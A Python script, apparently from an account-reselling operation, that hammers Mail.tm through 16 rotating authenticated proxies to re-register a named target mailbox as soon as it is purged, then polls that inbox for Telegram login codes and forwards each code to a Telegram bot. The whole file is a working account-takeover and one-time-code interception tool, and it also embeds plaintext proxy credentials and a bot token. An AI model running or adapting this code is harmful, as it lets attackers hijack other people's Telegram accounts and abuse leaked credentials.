#!/usr/bin/env python3
"""
AccStore — Multi-Proxy Mail.tm Target Snatcher & Reconnector
Target: tg_e4mkn3twxli7@maxxspace.com

Rotates across all 16 residential/datacenter proxies concurrently.
1. Repeatedly attempts to claim/re-register the target address on Mail.tm.
   (Mail.tm periodically purges inactive accounts; the moment it drops, this script snatches it).
2. Concurrently probes token authentication.
3. The instant it captures the account, it locks in the known password, grabs a Bearer JWT,
   and streams incoming Telegram OTPs directly to console and file!
"""

import asyncio
import aiohttp
import json
import os
import sys
import time
import urllib.parse
from datetime import datetime

# ─────────────────────────────────────────────────────────────────
# CONFIGURATION
# ─────────────────────────────────────────────────────────────────
TARGET_EMAIL = "tg_e4mkn3twxli7@maxxspace.com"
NEW_PASSWORD = "AccStore_Recovered2026!"  # The password set when claimed

# 16 Proxies from configuration
PROXIES_RAW = [
    "45.115.195.162:6140:versenautobot:sliamhxywwwsf",
    "92.112.91.57:6292:versenautobot:sliamhxywwwsf",
    "104.239.91.116:5840:versenautobot:sliamhxywwwsf",
    "82.25.213.7:5359:versenautobot:sliamhxywwwsf",
    "206.206.124.11:6592:versenautobot:sliamhxywwwsf",
    "104.232.209.29:5987:versenautobot:sliamhxywwwsf",
    "172.120.120.145:5300:versenautobot:sliamhxywwwsf",
    "82.22.211.40:5848:versenautobot:sliamhxywwwsf",
    "104.222.185.127:5690:versenautobot:sliamhxywwwsf",
    "45.43.94.241:7491:versenautobot:sliamhxywwwsf",
    "216.74.80.63:6635:versenautobot:sliamhxywwwsf",
    "206.206.71.243:5883:versenautobot:sliamhxywwwsf",
    "136.0.105.59:6069:versenautobot:sliamhxywwwsf",
    "136.0.120.102:6120:versenautobot:sliamhxywwwsf",
    "145.223.46.184:5734:versenautoproxy:de2dfs2fswe",
    "142.202.254.11:5989:versenautoproxy:de2dfs2fswe",
]

MAILTM_API = "https://api.mail.tm"
RESULT_FILE = "claimed_mail.json"
OTP_FILE = "received_otp.txt"

# Optional Telegram Alert
BOT_TOKEN = "8795989766:AAElGE6R5Mb9e1Bh8KHTBzPvjOA-h0RrYQk"
ADMIN_ID = "7269045971"

# ─────────────────────────────────────────────────────────────────
# HELPER: FORMAT PROXIES
# ─────────────────────────────────────────────────────────────────
def format_proxy_url(p_str):
    parts = p_str.strip().split(":")
    if len(parts) == 4:
        host, port, user, pwd = parts
        user_enc = urllib.parse.quote(user, safe='')
        pwd_enc = urllib.parse.quote(pwd, safe='')
        return f"http://{user_enc}:{pwd_enc}@{host}:{port}"
    elif len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    return p_str

PROXY_URLS = [format_proxy_url(p) for p in PROXIES_RAW]

# ─────────────────────────────────────────────────────────────────
# STATS & STATE
# ─────────────────────────────────────────────────────────────────
stats = {
    "attempts": 0,
    "success": False,
    "start_time": time.time(),
    "token": None,
    "account_id": None
}

async def send_telegram_alert(text):
    if not BOT_TOKEN or not ADMIN_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": ADMIN_ID, "text": text, "parse_mode": "HTML"}
        async with aiohttp.ClientSession() as session:
            await session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=5))
    except Exception:
        pass

# ─────────────────────────────────────────────────────────────────
# INBOX LISTENER (Once Claimed)
# ─────────────────────────────────────────────────────────────────
async def monitor_inbox(token, proxy_url):
    print(f"\n🎧 [INBOX MONITOR] Actively listening for Telegram OTPs on {TARGET_EMAIL}...")
    seen_ids = set()
    headers = {"Authorization": f"Bearer {token}", "User-Agent": "Mozilla/5.0"}
    
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{MAILTM_API}/messages", headers=headers, proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        messages = data.get("hydra:member", [])
                        for msg in messages:
                            mid = msg.get("id")
                            if mid not in seen_ids:
                                seen_ids.add(mid)
                                # Fetch full message
                                async with session.get(f"{MAILTM_API}/messages/{mid}", headers=headers, proxy=proxy_url) as f_resp:
                                    if f_resp.status == 200:
                                        full = await f_resp.json()
                                        subject = full.get("subject", "")
                                        intro = full.get("intro", "")
                                        text_content = full.get("text", "")
                                        full_body = f"{subject} {intro} {text_content}"
                                        
                                        import re
                                        codes = re.findall(r"\b(\d{5,6})\b", full_body)
                                        otp = codes[0] if codes else "Unknown"
                                        
                                        banner = f"""
╔══════════════════════════════════════════════════════════════════════╗
║                    🚨 TELEGRAM OTP RECEIVED! 🚨                      ║
╠══════════════════════════════════════════════════════════════════════╣
║ Email:   {TARGET_EMAIL:<52} ║
║ OTP:     {otp:<52} ║
║ Subject: {subject[:52]:<52} ║
║ Time:    {datetime.now().strftime('%Y-%m-%d %I:%M:%S %p'):<52} ║
╚══════════════════════════════════════════════════════════════════════╝
"""
                                        print(banner, flush=True)
                                        with open(OTP_FILE, "a") as f:
                                            f.write(f"[{datetime.now().isoformat()}] OTP: {otp} | Subject: {subject}\nFull: {full_body}\n\n")
                                        
                                        await send_telegram_alert(
                                            f"🚨 <b>TELEGRAM OTP RECEIVED!</b>\n"
                                            f"• Email: <code>{TARGET_EMAIL}</code>\n"
                                            f"• OTP Code: <b>{otp}</b>\n"
                                            f"• Subject: {subject}"
                                        )
        except Exception as e:
            # print(f"[INBOX ERROR] {e}")
            pass
        await asyncio.sleep(2.5)

# ─────────────────────────────────────────────────────────────────
# WORKER: ATTEMPT TO CLAIM
# ─────────────────────────────────────────────────────────────────
async def worker(worker_id, proxy_url):
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (AccStore/2.0)"}
    payload_register = {"address": TARGET_EMAIL, "password": NEW_PASSWORD}
    
    backoff = 2.0
    while not stats["success"]:
        stats["attempts"] += 1
        curr_att = stats["attempts"]
        elapsed = int(time.time() - stats["start_time"])
        
        try:
            timeout = aiohttp.ClientTimeout(total=8)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                # 1. Try to register/claim
                async with session.post(
                    f"{MAILTM_API}/accounts",
                    json=payload_register,
                    headers=headers,
                    proxy=proxy_url
                ) as resp:
                    status = resp.status
                    
                    if status in (200, 201):
                        data = await resp.json()
                        stats["success"] = True
                        stats["account_id"] = data.get("id")
                        print(f"\n🎉🎉🎉 [WORKER-{worker_id}] CLAIM SUCCESSFUL! Account created: {TARGET_EMAIL}", flush=True)
                        
                        # Get token immediately
                        async with session.post(
                            f"{MAILTM_API}/token",
                            json=payload_register,
                            headers=headers,
                            proxy=proxy_url
                        ) as tok_resp:
                            tok_data = await tok_resp.json()
                            token = tok_data.get("token")
                            stats["token"] = token
                            
                            info = {
                                "email": TARGET_EMAIL,
                                "password": NEW_PASSWORD,
                                "token": token,
                                "account_id": stats["account_id"],
                                "claimed_at": datetime.now().isoformat()
                            }
                            with open(RESULT_FILE, "w") as f:
                                json.dump(info, f, indent=2)
                            
                            print(f"🔑 Token Acquired! Saved credentials to {RESULT_FILE}", flush=True)
                            await send_telegram_alert(
                                f"🎉 <b>MAILBOX RECOVERED & CLAIMED!</b>\n"
                                f"• Email: <code>{TARGET_EMAIL}</code>\n"
                                f"• New Password: <code>{NEW_PASSWORD}</code>\n"
                                f"• Listening for incoming OTPs..."
                            )
                            # Start monitor on this proxy
                            await monitor_inbox(token, proxy_url)
                            return

                    elif status == 422:
                        # Address is still occupied on Mail.tm
                        if curr_att % 15 == 0:
                            print(f"[{elapsed}s | Req #{curr_att}] Probing Mail.tm across 16 proxies... (Status 422: in use, waiting for release/drop)", flush=True)
                        await asyncio.sleep(1.0)
                        
                    elif status == 429:
                        # Rate limit hit on this proxy, wait and back off
                        print(f"[Worker-{worker_id}] ⏳ Rate limit 429 on proxy. Cooling down for 10s...", flush=True)
                        await asyncio.sleep(10)
                    else:
                        await asyncio.sleep(2)

        except (aiohttp.ClientError, asyncio.TimeoutError, OSError):
            await asyncio.sleep(2.0)
        except Exception:
            await asyncio.sleep(2.5)

# ─────────────────────────────────────────────────────────────────
# MAIN RUNNER
# ─────────────────────────────────────────────────────────────────
async def main():
    print("=" * 65, flush=True)
    print(f"🚀 AccStore Multi-Proxy Mail Snatcher Started", flush=True)
    print(f"🎯 Target Email:   {TARGET_EMAIL}", flush=True)
    print(f"🔑 Target Pass:    {NEW_PASSWORD}", flush=True)
    print(f"🌐 Active Proxies: {len(PROXY_URLS)} proxies running concurrently", flush=True)
    print(f"📡 Method:         Continuous multi-proxy claiming loop", flush=True)
    print("=" * 65, flush=True)
    print("Initiating requests... Press Ctrl+C to stop anytime.\n", flush=True)

    tasks = [
        asyncio.create_task(worker(i + 1, p_url))
        for i, p_url in enumerate(PROXY_URLS)
    ]
    
    try:
        await asyncio.gather(*tasks)
    except (KeyboardInterrupt, asyncio.CancelledError):
        print("\n🛑 Stopped by user.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
